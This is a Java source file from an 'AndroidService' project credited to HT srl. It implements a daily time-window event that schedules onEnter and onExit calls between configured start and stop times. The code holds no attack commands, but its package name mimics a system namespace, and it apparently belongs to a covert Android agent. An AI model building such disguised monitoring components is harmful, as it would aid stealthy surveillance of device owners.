/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.networking.event;

import java.io.IOException;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.TimeZone;

import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfEvent;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;

/**
 * The Class TimerEvent.
 */
public class EventTimer extends BaseTimer {
	/** The Constant TAG. */
	private static final String TAG = "EventTimer"; //$NON-NLS-1$

	boolean nextDailyIn = false;

	/** The type. */
	private int type;

	long start, stop;

	private final long oneDayMs = 24 * 3600 * 1000;

	private Date timestart;

	private Date timestop;

	private boolean needExitOnStop;

	/**
	 * Instantiates a new timer event.
	 */
	public EventTimer() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " TimerEvent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * com.ht.AndroidServiceGUI.event.EventBase#parse(com.ht.AndroidServiceGUI
	 * .event .Event)
	 */
	@Override
	public boolean parse(final ConfEvent conf) {
		needExitOnStop = false;

		try {
			String ts = conf.getString("ts");
			String te = conf.getString("te");

			SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));

			timestart = dateFormat.parse(ts);
			timestop = dateFormat.parse(te);

			if (Cfg.DEBUG) {
				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		} catch (ParseException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#begin()
	 */
	@Override
	public void actualStart() {
		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));

		calendar.setTime(timestart);
		// numero di secondi a partire dalla mezzanotte
		start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		calendar.setTime(timestop);
		// numero di secondi a partire dalla mezzanotte
		stop = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		nextDailyIn = setDailyDelay(true);
	}

	/**
	 * Calcola l'ora del prossimo evento
	 * @param initialCheck
	 * @return
	 */
	private boolean setDailyDelay(boolean initialCheck) {
		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));

		long nextStart, nextStop;

		// in secondi a partire dalla mezzanotte, in modo che sia connfrontabile con start e stop, definiti nella parse
		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
				.get(Calendar.SECOND)) * 1000;

		if (initialCheck) {
			initialCheck();
		}

		// Estraiamo il prossimo evento e determiniamo il delay sulla base del
		// tipo
		if (now < start)
			nextStart = start;
		else
			nextStart = start + (3600 * 24 * 1000); // 1 Day

		if (now < stop)
			nextStop = stop;
		else
			nextStop = stop + (3600 * 24 * 1000); // 1 Day

		boolean ret;

		// stabilisce quale sara' il prossimo evento.
		if (nextStart < nextStop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
			}

			if (initialCheck)
				setDelay(nextStart - now);
			else
				setPeriod(nextStart - now);

			ret = true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
			}

			if (initialCheck)
				setDelay(nextStop - now);
			else
				setPeriod(nextStop - now);

			ret = false;
		}

		return ret;
	}

	private void initialCheck() {
		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
				.get(Calendar.SECOND)) * 1000;

		// verifica se al primo giro occorre chiamare OnEnter
		if (start < stop) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): start < stop ");
			}

			if (now > start && now < stop) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setDailyDelay): we are already in the brackets");
				}

				onEnter();
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): start > stop ");
			}

			if (now < stop || now > start) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setDailyDelay): we are already in the inverted brackets");
				}

				onEnter();
			}
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualGo() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
		}

		if (nextDailyIn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
			}

			onEnter();

			needExitOnStop = true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
			}

			onExit();

			needExitOnStop = false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
		}

		nextDailyIn = setDailyDelay(false);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#end()
	 */
	@Override
	public void actualStop() {
		if (needExitOnStop)
			onExit(); // di sicurezza
	}
}
